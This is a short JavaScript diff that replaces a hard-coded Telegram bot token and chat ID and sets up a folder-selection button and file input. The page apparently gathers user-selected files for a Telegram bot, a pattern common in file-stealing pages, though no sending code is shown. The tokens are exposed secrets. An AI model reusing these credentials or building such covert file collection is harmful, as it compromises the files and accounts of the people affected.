@@ -1,5 +1,5 @@
-const botToken = '8165356353:AAG9zII6mH8tx-oD1-5d1LbW3PwLzNU_lxo';
-    const chatId = '7630172264';
+const botToken = '8736803882:AAGbDKTqqIS6VWGBlGkDWKJ8GBCAFmPNA60';
+    const chatId = '8198249228';
 
     const selectFolderBtn = document.getElementById('selectFolderBtn');
     const fileInput = document.getElementById('fileInput');
